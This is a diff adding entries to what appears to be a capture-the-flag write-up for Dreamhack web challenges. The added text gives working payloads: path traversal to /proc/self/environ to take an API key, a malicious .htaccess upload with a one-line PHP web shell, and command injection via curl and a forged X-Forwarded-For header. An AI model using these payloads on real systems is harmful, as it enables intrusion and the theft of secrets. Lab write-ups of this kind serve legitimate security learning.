@@ -243,3 +243,53 @@ Use Browser Console to change the input:
 ```html
 <input type="text" name="password[]" value="123" />
 ```
+
+## File Vulnerability Advanced for linux
+
+Visit `/file?path=../../proc/self/environ` to get the `API_KEY` environment variable.
+
+Then use it in the `/admin` route to get the flag: `/admin?cmd=/flag&API_KEY=<API_KEY>`
+
+## Apache htaccess
+
+Upload malicious `.htaccess`:
+
+```
+AddType application/x-httpd-php .png
+```
+
+Tells application to treat any `.png` files as `.php`. Upload `shell.png`:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Visit `/upload/shell.png?cmd=/flag` to get the flag.
+
+## what-is-my-ip
+
+Use this command to fake IP:
+
+```bash
+curl -H "X-Forwarded-For: EVIL_IP" http://host8.dreamhack.games:21370/
+```
+
+Get the flag:
+
+```bash
+curl -H "X-Forwarded-For: \$(cat /flag)" http://host8.dreamhack.games:21370/
+```
+
+## BypassIF
+
+Trigger the exception to get the `KEY`:
+
+```bash
+curl -X POST http://host8.dreamhack.games:22666/flag --data-urlencode "key=1" --data-urlencode "cmd_input=sleep 6"
+```
+
+Then get the flag:
+
+```bash
+curl -X POST http://host8.dreamhack.games:22666/flag --data-urlencode "key=409ac0d96943d3da52f176ae9ff2b974" --data-urlencode "cmd_input="
+```
